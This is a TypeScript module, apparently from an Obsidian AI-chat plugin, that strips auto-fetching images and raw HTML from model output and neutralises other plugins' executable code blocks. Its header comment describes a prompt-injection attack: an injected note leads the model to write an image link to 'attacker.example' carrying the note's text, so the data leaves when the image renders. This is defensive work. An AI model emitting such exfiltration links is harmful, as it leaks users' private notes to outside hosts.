/**
 * Model output without the parts that fetch from the network on their own (#137, security review 2026-09-30).
 *
 * The chat renders the model's answers as Markdown, and a rendered image is fetched as soon as it exists. An
 * injected note could have the model write `![](https://attacker.example/x.png?d=<the note's text>)`, and the note
 * would leave the machine without any tool running. So before rendering, an image from the web becomes a link the
 * user can open (nothing is fetched without that click), and raw HTML tags are shown as text — `<img>`, `<video>`,
 * `<iframe>` and the like load by themselves. Images from the vault (`![[…]]`, relative paths) stay; code blocks
 * and inline code are left exactly as written.
 */

import { NATIVE_BLOCKS, type IsPluginBlock } from "../core/contentRisks";
import { isRemote } from "../core/remoteUrl";

export { isRemote };

/** The label a blocked image gets: its alt text, or the host it would have come from. */
function label(alt: string, url: string): string {
  const shown = alt.trim() || (/^(?:[a-z][a-z0-9+.-]*:)?\/\/([^/?#\s>]+)/i.exec(url.trim().replace(/^</, ""))?.[1] ?? "remote");
  return `image: ${shown.replace(/[[\]]/g, "")} (not loaded)`;
}

const INLINE_IMAGE = /!\[([^\]\n]*)\]\(\s*(<[^>\n]*>|[^)\s]+)((?:\s+(?:"[^"\n]*"|'[^'\n]*'|\([^)\n]*\)))?\s*)\)/g;
const REFERENCE_IMAGE = /!\[([^\]\n]*)\](?:\[([^\]\n]*)\])?(?![([])/g;
const DEFINITION = /^ {0,3}\[([^\]\n]+)\]:\s*(<[^>\n]*>|\S+)/gm;
// A tag's start: `<name` followed by a space, `/` or `>` — not an autolink such as <https://…> or <a@b.c>
const HTML_TAG = /<(?=\/?[a-z][a-z0-9-]*[\s/>])/gi;

/**
 * *text* with *transform* applied outside fenced code blocks and inline code, and *span* to each inline code span
 * outside the blocks.
 */
function outsideCode(text: string, transform: (prose: string) => string,
                     span: (code: string) => string = (code) => code): string {
  const out: string[] = [];
  let prose: string[] = [];
  let fence: string | null = null;
  const flush = (): void => {
    if (!prose.length) return;
    // Inline code spans: a run of backticks, and the same run closing it
    out.push(prose.join("\n").split(/(`+[\s\S]*?`+)/).map((part, index) => (index % 2 ? span(part) : transform(part))).join(""));
    prose = [];
  };
  for (const line of text.split("\n")) {
    const marker = /^ {0,3}(`{3,}|~{3,})/.exec(line)?.[1];
    if (fence) {
      out.push(line);
      if (marker && marker[0] === fence[0] && marker.length >= fence.length) fence = null;
    } else if (marker) {
      flush();
      out.push(line);
      fence = marker;
    } else {
      prose.push(line);
    }
  }
  flush();
  return out.join("\n");
}

/**
 * *markdown* with the code other plugins would run shown as code (#395): a fenced block whose language another
 * plugin registered a processor for (`dataviewjs`, `js-engine`) becomes a plain `text` block, and Dataview's inline
 * queries (`` `= …` ``, `` `$= …` ``) get a zero-width space before the `=`, which keeps them from matching. Obsidian's
 * own blocks (Bases, `query`, Mermaid, math) and ordinary code are left as they are.
 */
export function withoutPluginCode(markdown: string, isPluginBlock: IsPluginBlock): string {
  let fence: string | null = null;
  const lines = markdown.split("\n").map((line) => {
    const match = /^( {0,3})(`{3,}|~{3,})([ \t]*)([^\s`]*)(.*)$/.exec(line);
    if (fence) {
      if (match && match[2][0] === fence[0] && match[2].length >= fence.length && !match[4]) fence = null;
      return line;
    }
    if (!match) return line;
    fence = match[2];
    const language = match[4].toLowerCase();
    return language && !NATIVE_BLOCKS.has(language) && isPluginBlock(language)
      ? `${match[1]}${match[2]}text` : line;
  });
  return outsideCode(lines.join("\n"), (prose) => prose,
                     (code) => code.replace(/^(`+)(\s*)(?=\$?=)/, `$1$2${ZERO_WIDTH_SPACE}`));
}

const ZERO_WIDTH_SPACE = String.fromCharCode(0x200b);
const URL_IN_TAG = /(?:https?:)?\/\/[^\s"'()<>]+/i;

/**
 * *markdown* with images from the web turned into links, and raw HTML tags shown as text: every tag for the chat,
 * only tags that name an address on the web for a note (*Insert into note*, #395), where the user's own HTML stays.
 */
export function withoutRemoteMedia(markdown: string, tags: "all" | "remote" = "all"): string {
  const definitions = new Map<string, string>();
  for (const match of markdown.matchAll(DEFINITION)) definitions.set(match[1].trim().toLowerCase(), match[2]);
  return outsideCode(markdown, (prose) => prose
    .replace(INLINE_IMAGE, (whole, alt: string, url: string, title: string) =>
      (isRemote(url) ? `[${label(alt, url)}](${url}${title})` : whole))
    .replace(REFERENCE_IMAGE, (whole, alt: string, ref: string | undefined) => {
      const target = definitions.get((ref || alt).trim().toLowerCase());
      return target && isRemote(target) ? whole.slice(1).replace(`[${alt}]`, `[${label(alt, target)}]`) : whole;
    })
    .replace(tags === "all" ? HTML_TAG : /<(?=\/?[a-z][a-z0-9-]*[\s/>][^>]*>)/gi, (open, at: number, whole: string) => {
      if (tags === "all") return "&lt;";
      const tag = whole.slice(at, whole.indexOf(">", at) + 1);
      return URL_IN_TAG.test(tag) && !/^<a[\s>]/i.test(tag) ? "&lt;" : open;
    }));
}
